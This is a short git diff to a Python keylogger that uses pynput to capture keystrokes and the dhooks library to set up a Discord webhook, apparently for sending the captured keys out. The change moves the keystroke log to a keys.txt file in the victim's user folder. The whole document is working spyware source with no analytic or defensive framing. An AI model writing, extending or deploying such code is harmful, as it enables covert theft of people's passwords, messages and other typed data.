@@ -1,6 +1,6 @@
 from pynput import keyboard
-from os import remove
-from os.path import isfile, split
+from os import remove, getenv
+from os.path import isfile
 from threading import Thread
 from dhooks import *
 from time import sleep
@@ -13,14 +13,7 @@ lien = Webhook(lien)
 
 keys = {}
 
-fichier = __file__.split("\\")
-f = ""
-for i in range(3):
-    f += fichier[i]
-    f += "\\"
-
-f += "keys.txt"
-fichier = f
+fichier = f"C:/Users/{getenv('username')}/keys.txt"
 
 if isfile(fichier):
     try:
